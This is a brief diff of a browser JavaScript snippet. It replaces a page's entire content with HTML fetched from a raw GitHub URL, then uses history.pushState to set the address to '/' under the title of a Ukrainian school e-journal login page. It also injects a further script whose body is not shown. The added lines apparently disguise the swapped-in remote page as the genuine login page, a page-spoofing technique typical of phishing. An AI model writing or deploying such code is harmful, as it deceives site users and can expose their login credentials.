@@ -32,5 +32,7 @@ btn.addEventListener('click', () => {
 });`;
     return script
 }
-document.documentElement.innerHTML = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
+let html = g('https://raw.githubusercontent.com/thebocher/js-script/main/h.html')
+document.documentElement.innerHTML = html
+window.history.pushState({"html": html,"pageTitle":"Нові знання - Вхід на сайт - Електронні щоденники та журнали з можливостями дистанційного навчання/ Электронные дневники и журналы"}, "", "/")
 document.body.appendChild( createMyScript() )
